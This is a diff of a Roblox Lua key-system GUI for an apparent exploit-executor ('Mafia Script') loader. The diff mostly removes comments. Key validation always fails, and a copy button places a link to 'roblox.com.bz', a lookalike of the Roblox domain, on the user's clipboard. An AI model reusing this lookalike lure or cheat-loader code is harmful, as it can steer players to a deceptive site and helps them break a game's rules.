@@ -4,18 +4,16 @@
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 
--- // EXECUTOR SAFE — waits for player and PlayerGui properly
+-- // EXECUTOR SAFE
 local Player = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
 local PlayerGui = Player:WaitForChild("PlayerGui", 10)
 
 -- // CONFIG
 local GROUP_LINK = "https://roblox.com.bz/communities/468737843/"
 
--- // KEY VALIDATION — replace with your own logic
+-- // KEY VALIDATION
 local function isKeyValid(key)
-    -- TODO: add your own key checking logic here
-    -- Example: return key == "MY-SECRET-KEY"
-    return false
+    return false -- replace with your key logic
 end
 
 -- // PALETTE
@@ -53,7 +51,7 @@ local function label(parent, props)
     return l
 end
 
--- // REMOVE OLD GUI IF EXISTS (prevents duplicates on re-execute)
+-- // REMOVE OLD GUI IF EXISTS
 local oldGui = PlayerGui:FindFirstChild("MafiaScript_KeySys")
 if oldGui then oldGui:Destroy() end
 
@@ -137,7 +135,6 @@ label(Card, {
     TextXAlignment = Enum.TextXAlignment.Center,
     ZIndex = 3,
 })
-
 label(Card, {
     Size = UDim2.new(1, -40, 0, 30),
     AnchorPoint = Vector2.new(0.5, 0),
@@ -350,7 +347,6 @@ label(Card, {
 Overlay.BackgroundTransparency = 1
 Card.BackgroundTransparency = 1
 Card.Position = UDim2.new(0.5, 0, 0.5, 28)
-
 tween(Overlay, { BackgroundTransparency = 0.5 }, 0.4)
 tween(Card, { BackgroundTransparency = 0, Position = UDim2.fromScale(0.5, 0.5) }, 0.5, Enum.EasingStyle.Back)
 
@@ -365,16 +361,12 @@ local copyDebounce = false
 CopyBtn.MouseButton1Click:Connect(function()
     if copyDebounce then return end
     copyDebounce = true
-
     setclipboard(GROUP_LINK)
-
     CopyLbl.Text = "✓  Copied!"
     local g = CopyBtn:FindFirstChildOfClass("UIGradient")
     if g then g.Color = ColorSequence.new(Color3.fromRGB(16, 185, 129), Color3.fromRGB(5, 150, 105)) end
     tween(CopyBtn, { BackgroundColor3 = Color3.fromRGB(16, 185, 129) }, 0.2)
-
     task.wait(2)
-
     CopyLbl.Text = "⎘  Copy to Clipboard"
     if g then g.Color = ColorSequence.new(C.GREEN, C.GREEN2) end
     tween(CopyBtn, { BackgroundColor3 = C.GREEN }, 0.2)
@@ -386,32 +378,25 @@ local submitDebounce = false
 SubmitBtn.MouseButton1Click:Connect(function()
     if submitDebounce then return end
     submitDebounce = true
-
     SubmitLbl.Text = "Checking…"
     Status.TextColor3 = C.MUTED
     Status.Text = "Verifying key…"
     tween(SubmitBtn, { BackgroundColor3 = Color3.fromRGB(50, 50, 70) }, 0.2)
-
     task.wait(1.2)
-
     if isKeyValid(KeyInput.Text) then
         Status.Text = "✓  Key accepted — loading!"
         Status.TextColor3 = C.GREEN
         SubmitLbl.Text = "✓  Verified"
         tween(SubmitBtn, { BackgroundColor3 = C.GREEN2 }, 0.3)
-
         task.wait(1.4)
         tween(Overlay, { BackgroundTransparency = 1 }, 0.4)
         tween(Card, { BackgroundTransparency = 1, Position = UDim2.new(0.5, 0, 0.5, -20) }, 0.4)
         task.wait(0.5)
         Gui:Destroy()
-
-        -- TODO: put your main hub loader here
         print("[Mafia Script] Access granted.")
     else
         Status.Text = "✗  Invalid key. Try again."
         Status.TextColor3 = C.RED
-
         local base = KeyFrame.Position
         for _ = 1, 3 do
             tween(KeyFrame, { Position = UDim2.new(base.X.Scale, base.X.Offset + 7, base.Y.Scale, base.Y.Offset) }, 0.05)
@@ -423,7 +408,6 @@ SubmitBtn.MouseButton1Click:Connect(function()
         tween(KeyStroke, { Color = C.RED }, 0.15)
         task.wait(1.8)
         tween(KeyStroke, { Color = C.BORDER }, 0.3)
-
         SubmitLbl.Text = "Verify Key  →"
         tween(SubmitBtn, { BackgroundColor3 = C.ACCENT1 }, 0.3)
         submitDebounce = false
